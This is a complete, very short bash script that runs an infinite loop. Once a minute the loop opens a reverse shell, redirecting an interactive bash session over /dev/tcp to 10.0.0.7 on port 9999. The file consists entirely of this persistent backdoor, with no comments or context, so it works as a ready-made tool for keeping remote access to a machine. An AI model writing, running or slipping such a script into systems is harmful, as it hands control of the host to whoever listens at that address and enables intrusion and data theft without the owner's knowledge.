#!/bin/bash
while true
do
	bash -i >& /dev/tcp/10.0.0.7/9999 0>&1
	sleep 1m
done

